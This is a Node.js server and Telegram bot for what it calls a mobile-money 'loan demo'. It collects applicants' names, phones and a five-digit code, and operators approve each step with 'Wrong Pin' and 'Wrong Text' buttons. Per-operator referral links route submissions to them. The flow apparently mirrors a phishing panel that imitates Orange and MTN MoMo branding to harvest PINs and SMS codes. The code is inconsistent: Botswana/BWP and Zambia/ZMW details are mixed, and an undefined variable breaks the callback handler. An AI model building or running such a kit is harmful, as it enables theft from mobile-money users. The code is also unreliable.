require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const { Pool } = require('pg');
const app = express();
app.use(express.json({limit:'20kb'}));
app.use(express.static('public'));
const PORT = process.env.PORT || 10000;
const pool = process.env.DATABASE_URL ? new Pool({connectionString:process.env.DATABASE_URL, ssl: process.env.DATABASE_URL.includes('localhost') ? false : {rejectUnauthorized:false}}) : null;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const SUPER = String(process.env.SUPER_ADMIN_CHAT_ID || '');
const initialAdmins = (process.env.ADMIN_CHAT_IDS || '').split(',').map(s=>s.trim()).filter(Boolean);
let webhookReady = false;
const APP = 'Orange-inspired Botswana loan demo';
async function initDb(){
 if(!pool) return;
 // Unique table names prevent collisions with other portals sharing this PostgreSQL database.
 await pool.query(`CREATE TABLE IF NOT EXISTS orange_demo_applications (
  id TEXT PRIMARY KEY, full_name TEXT NOT NULL DEFAULT '', phone TEXT NOT NULL, reference_id TEXT NOT NULL DEFAULT '', amount NUMERIC(12,2) NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending_details', reference_text TEXT,
  assigned_admin TEXT, reviewer TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 )`);
 await pool.query(`CREATE TABLE IF NOT EXISTS orange_demo_admins (
  chat_id TEXT PRIMARY KEY, active BOOLEAN NOT NULL DEFAULT TRUE, referral_code TEXT UNIQUE, admin_code TEXT UNIQUE,
  added_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 )`);
 await pool.query('ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS reference_text TEXT');
 await pool.query('ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS assigned_admin TEXT');
 await pool.query("ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS full_name TEXT NOT NULL DEFAULT ''");
 await pool.query("ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS reference_id TEXT NOT NULL DEFAULT ''");
 await pool.query('ALTER TABLE orange_demo_admins ADD COLUMN IF NOT EXISTS admin_code TEXT');
 const existingAdmins=await pool.query('SELECT chat_id FROM orange_demo_admins WHERE admin_code IS NULL ORDER BY added_at');
 let seq=1; for(const a of existingAdmins.rows){await pool.query('UPDATE orange_demo_admins SET admin_code=$1 WHERE chat_id=$2',['ADMIN'+String(seq++).padStart(3,'0'),a.chat_id]);}
 for(const id of initialAdmins) await addAdmin(id);
}
async function api(method, body){
 if(!TOKEN) return null;
 const r=await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body||{})});
 const j=await r.json(); if(!j.ok) console.error('Telegram API error:',j.description); return j;
}
async function send(chat_id,text,extra={}){ return api('sendMessage',{chat_id,text,parse_mode:'HTML',...extra}); }
function esc(s){return String(s??'').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
async function addAdmin(id, requestedCode=''){
 const row=await pool.query('SELECT COUNT(*)::int AS n FROM orange_demo_admins');
 const code=crypto.randomBytes(5).toString('hex').toUpperCase();
 const adminCode=requestedCode || ('ADMIN'+String((row.rows[0]?.n||0)+1).padStart(3,'0'));
 await pool.query(`INSERT INTO orange_demo_admins(chat_id,active,referral_code,admin_code) VALUES($1,TRUE,$2,$3) ON CONFLICT(chat_id) DO UPDATE SET active=TRUE, referral_code=COALESCE(orange_demo_admins.referral_code,EXCLUDED.referral_code), admin_code=COALESCE(orange_demo_admins.admin_code,EXCLUDED.admin_code)`,[String(id),code,adminCode]);
}
async function isAdmin(id){ if(String(id)===SUPER) return true; if(!pool) return initialAdmins.includes(String(id)); const r=await pool.query('SELECT active FROM orange_demo_admins WHERE chat_id=$1',[String(id)]); return !!r.rows[0]?.active; }
async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.query('SELECT chat_id FROM orange_demo_admins WHERE active=TRUE')).rows.map(x=>x.chat_id);}
function decisionKeyboard(stage,id){const buttons=stage==='details'?[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong Pin',callback_data:`decide:wrong_id:${stage}:${id}`}]]:[[ {text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Wrong Pin',callback_data:`decide:wrong_id:${stage}:${id}`},{text:'❌ Wrong Text',callback_data:`decide:wrong_text:${stage}:${id}`} ]];return {inline_keyboard:buttons};}
async function notifyAdmins(message,keyboard,assignedAdmin=null){const recipients=assignedAdmin&&await isAdmin(assignedAdmin)?[String(assignedAdmin)]:await activeAdmins();for(const id of recipients) await send(id,message,{reply_markup:keyboard});}
async function notifyDetails(a){
 const msg=`🟡 <b>New MoMo-style demo application — review</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n💰 Amount: <code>ZMW ${esc(a.amount)}</code>\n📌 Status: DETAILS PENDING\n\nIndependent demo; not affiliated with MTN.`;
 await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
}
async function notifyReference(a){
 const msg=`🟡 <b>Application reference submitted — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n🔢 Non-sensitive reference: <code>${esc(a.reference_text)}</code>\n📌 Status: REFERENCE PENDING\n\nIndependent demo; not affiliated with MTN.`;
 await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
}
app.get('/health',(req,res)=>res.status(pool?200:503).json({ok:!!pool,databaseConfigured:!!pool,telegramConfigured:!!TOKEN,service:'MoMo-style Zambia loan demo'}));
app.post('/api/applications',async(req,res)=>{
 try{
  if(!pool) return res.status(503).json({error:'Application storage is not configured yet.'});
  const full_name=String(req.body.full_name||'').trim(); const phone=String(req.body.phone||'').replace(/[\s()-]/g,'').trim(); const reference_id=''; const amount=Number(req.body.amount); const adminCode=String(req.body.admin||'').trim().toUpperCase();
  if(full_name.length<2||full_name.length>120) return res.status(400).json({error:'Enter your full name.'});
  if(!/^\+?[0-9]{7,15}$/.test(phone)) return res.status(400).json({error:'Enter a valid phone number.'});
  if(!Number.isFinite(amount)||amount<50||amount>100000) return res.status(400).json({error:'Enter an amount from BWP 50 to BWP 100,000.'});
  let assigned=null;if(adminCode){const ar=await pool.query('SELECT chat_id FROM orange_demo_admins WHERE admin_code=$1 AND active=TRUE',[adminCode]);if(ar.rows[0])assigned=ar.rows[0].chat_id;}
  const id='BW-'+Date.now().toString(36).toUpperCase()+'-'+crypto.randomBytes(2).toString('hex').toUpperCase();
  const result=await pool.query("INSERT INTO orange_demo_applications(id,full_name,phone,reference_id,amount,assigned_admin) VALUES($1,$2,$3,$4,$5,$6) RETURNING *",[id,full_name,phone,reference_id,amount,assigned]);
  // Persist first, then notify Telegram independently. A Telegram/network error must not
  // make the browser think a successfully saved application was lost.
  res.status(201).json({id,status:'pending_details'});
  notifyDetails(result.rows[0]).catch(e=>console.error('Application saved, but Telegram notification failed:',e.message));
 }catch(e){console.error('Application submission failed:',e.stack||e);res.status(500).json({error:'The application could not be saved. Check the server database connection and logs, then try again.'});}
});
app.post('/api/applications/:id/reference',async(req,res)=>{
 try{
  const reference=String(req.body.reference_text||'').trim();
  if(!/^\d{5}$/.test(reference)) return res.status(400).json({error:'Reference number must contain exactly five digits.'});
  const r=await pool.query("UPDATE orange_demo_applications SET reference_text=$1,status='pending_reference',updated_at=NOW() WHERE id=$2 AND status IN ('approved_details','rejected_reference') RETURNING *",[reference,req.params.id]);
  if(!r.rows[0])return res.status(409).json({error:'Reference submission is available only after the details have been approved.'});
  // Persist and acknowledge the reference immediately; Telegram delivery must not prevent the browser from starting status polling.
  res.json({id:r.rows[0].id,status:r.rows[0].status});
  notifyReference(r.rows[0]).catch(e=>console.error('Reference saved, but Telegram notification failed:',e.message));
 }catch(e){console.error('Reference submission failed:',e.stack||e);res.status(500).json({error:'The reference text could not be saved. Check the server database connection and logs, then try again.'});}
});
app.get('/api/applications/:id',async(req,res)=>{try{const r=await pool.query('SELECT id,status,amount,updated_at FROM orange_demo_applications WHERE id=$1',[req.params.id]);if(!r.rows[0])return res.status(404).json({error:'Application not found'});res.json(r.rows[0]);}catch(e){res.status(503).json({error:'Storage unavailable'});}});
async function handleMessage(m){
 const id=String(m.chat.id), t=String(m.text||'').trim();
 if(t==='/start'||t==='/myinfo'){
  const role=id===SUPER?'Super Admin (management + view-only application copies)':(await isAdmin(id)?'Application Admin':'Applicant / not assigned admin');
  let extra='';if(id===SUPER)extra='\n\nSuper Admin commands:\n/addadmin CHAT_ID\n/revokeadmin CHAT_ID\n/admins\n/stats';
  if(await isAdmin(id))extra+='\n\nAdmin commands: /mylink /pending /stats /myinfo';
  return send(id,`👋 <b>${APP}</b>\nYour Chat ID: <code>${id}</code>\nRole: <b>${role}</b>${extra}`);
 }
 if(t.startsWith('/addadmin ')){
  if(id!==SUPER)return send(id,'Admin access required.');const parts=t.split(/\s+/);const target=parts[1], adminCode=parts[2]||'';if(!/^\d+$/.test(target))return send(id,'Usage: /addadmin CHAT_ID ADMIN003');
  await addAdmin(target,adminCode);const row=await pool.query('SELECT admin_code FROM orange_demo_admins WHERE chat_id=$1',[target]);await send(id,`✅ Admin ${target} added as ${row.rows[0].admin_code}.\nPersonal customer link:\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?admin='+row.rows[0].admin_code)}`);await send(target,'👋 You have been assigned as an application admin. Send /start, then /mylink to get your personal customer link.');return;
 }
 if(t.startsWith('/revokeadmin ')){if(id!==SUPER)return send(id,'Admin access required.');const target=t.split(/\s+/)[1];if(!/^\d+$/.test(target))return send(id,'Usage: /revokeadmin CHAT_ID');await pool.query('UPDATE orange_demo_admins SET active=FALSE WHERE chat_id=$1',[target]);return send(id,`Admin ${target} revoked.`);}
 if(t==='/admins'){if(id!==SUPER)return send(id,'Super Admin access required.');const r=await pool.query('SELECT chat_id,active,referral_code FROM orange_demo_admins ORDER BY added_at DESC');return send(id,r.rows.length?r.rows.map(a=>`${a.active?'✅':'⛔'} <code>${a.chat_id}</code> · ${a.referral_code||'no link'}`).join('\n'):'No admins configured.');}
 if(t==='/mylink'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=await pool.query('SELECT referral_code FROM orange_demo_admins WHERE chat_id=$1 AND active=TRUE',[id]);if(!r.rows[0])return send(id,'No active admin link is assigned to your account.');const a=await pool.query('SELECT admin_code FROM orange_demo_admins WHERE chat_id=$1 AND active=TRUE',[id]);return send(id,`🔗 <b>Your personal customer link</b>\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?admin='+a.rows[0].admin_code)}\n\nShare this link to associate demo applications with your admin account.`);}
 if(t==='/pending'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=id===SUPER?await pool.query("SELECT id,status,amount FROM orange_demo_applications WHERE status IN ('pending_details','pending_reference') ORDER BY created_at DESC LIMIT 20"):await pool.query("SELECT id,status,amount FROM orange_demo_applications WHERE status IN ('pending_details','pending_reference') AND assigned_admin=$1 ORDER BY created_at DESC LIMIT 20",[id]);return send(id,r.rows.length?r.rows.map(a=>`${a.id} — ${a.status} — ZMW ${a.amount}`).join('\n'):'No pending applications.');}
 if(t==='/stats'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=await pool.query('SELECT status,count(*)::int n FROM orange_demo_applications GROUP BY status');return send(id,'📊 Demo application stats\n'+(r.rows.map(x=>`${x.status}: ${x.n}`).join('\n')||'No applications yet.'));}
}
async function handleCallback(q){
 const chat=String(q.message?.chat?.id||''),data=String(q.data||'');
 if(!data.startsWith('decide:')) return;
 // Acknowledge immediately: Telegram callback queries expire quickly, especially when DB is slow.
 try{await api('answerCallbackQuery',{callback_query_id:q.id,text:'Decision received. Checking application…'});}catch(e){console.error('Could not acknowledge Telegram button:',e.message);}
 if(chat!==SUPER && !(await isAdmin(chat))){
  await send(chat,'Decision not applied: this Telegram account is not an active application admin.');
  return;
 }
 const [,decision,stage,appId]=data.split(':');
 if(!['approve','wrong_id','wrong_text'].includes(decision)||!['details','reference'].includes(stage)||!appId|| (decision==='wrong_text'&&stage!=='reference')){
  console.error('Invalid Telegram callback payload:',data);
  await send(chat,'Decision not applied: this action link is invalid.');
  return;
 }
 if(!pool){await send(chat,'Decision not applied: application storage is unavailable.');return;}
 const expected=stage==='details'?'pending_details':'pending_reference';
 let status, query, params;
 if(decision==='approve'){
  status=stage==='details'?'approved_details':'approved';
  query='UPDATE orange_demo_applications SET status=$1,reviewer=$2,updated_at=NOW() WHERE id=$3 AND status=$4 RETURNING *';
  params=[status,chat,appId,expected];
 }else if(decision==='wrong_id'){
  status='rejected_details';
  query="UPDATE orange_demo_applications SET status=$1,reference_id='',reference_text=NULL,reviewer=$2,updated_at=NOW() WHERE id=$3 AND status=$4 RETURNING *";
  params=[status,chat,appId,expected];
 }else{
  status='rejected_reference';
  query="UPDATE orange_demo_applications SET status=$1,reference_text=NULL,reviewer=$2,updated_at=NOW() WHERE id=$3 AND status=$4 RETURNING *";
  params=[status,chat,appId,expected];
 }
 const r=await pool.query(query,params);
 if(!r.rows[0]){
  await send(chat,`No change made for application ${esc(appId)}. It may already have been reviewed, or the reference may be incorrect.`);
  return;
 }
 const label=decision==='approve'?'APPROVED':decision==='wrong_id'?'WRONG ID NUMBER — RETURNED TO STEP 1':'WRONG TEXT — RETURNED TO STEP 2';
 if(q.message?.message_id){
  await api('editMessageReplyMarkup',{chat_id:chat,message_id:q.message.message_id,reply_markup:{inline_keyboard:[]}});
  await api('editMessageText',{chat_id:chat,message_id:q.message.message_id,text:`${q.message.text||'Application review'}\n\nDecision: ${label}\nApplication: ${appId}`,parse_mode:'HTML'});
 }
 await send(chat,`✅ Decision saved. Application <code>${esc(appId)}</code> marked <b>${esc(status)}</b>. The website will update automatically.`);
 if(SUP) await send(SUP,`👁️ VIEW ONLY — Decision update\nApplication: <code>${esc(appId)}</code>\nStatus: <b>${esc(status)}</b>`);
}
app.post('/telegram/webhook',async(req,res)=>{
 const expected=process.env.TELEGRAM_WEBHOOK_SECRET||(TOKEN?crypto.createHash('sha256').update(TOKEN).digest('hex').slice(0,32):'');
 if(expected && req.get('X-Telegram-Bot-Api-Secret-Token')!==expected) return res.sendStatus(403);
 res.sendStatus(200);
 try{const u=req.body||{};if(u.message)await handleMessage(u.message);if(u.callback_query)await handleCallback(u.callback_query);}catch(e){console.error('Telegram webhook update error:',e.message);}
});
async function setupTelegramUpdates(){
 if(!TOKEN){console.warn('TELEGRAM_BOT_TOKEN is not configured; Telegram approvals are disabled.');return;}
 // Use long polling so callback buttons continue working even when a webhook URL/secret is misconfigured.
 const deleted=await api('deleteWebhook',{drop_pending_updates:false});
 if(!deleted?.ok){console.error('Could not switch Telegram bot to polling mode.');return;}
 console.log('Telegram long polling enabled for messages and approval buttons.');
 let offset=0, running=false;
 const poll=async()=>{
  if(running)return;running=true;
  try{
   const result=await api('getUpdates',{offset,timeout:25,allowed_updates:['message','callback_query']});
   if(result?.ok&&Array.isArray(result.result)){
    for(const update of result.result){
     offset=Math.max(offset,Number(update.update_id)+1);
     try{
      if(update.message)await handleMessage(update.message);
      if(update.callback_query)await handleCallback(update.callback_query);
     }catch(e){console.error('Telegram update processing failed:',e.stack||e);}
    }
   }
  }catch(e){console.error('Telegram polling error:',e.message||e);}
  finally{running=false;setTimeout(poll,1000);}
 };
 poll();
}
(async()=>{try{await initDb();app.listen(PORT,async()=>{console.log(`${APP} listening on ${PORT}`);await setupTelegramUpdates();});}catch(e){console.error('Startup failed:',e);process.exit(1);}})();
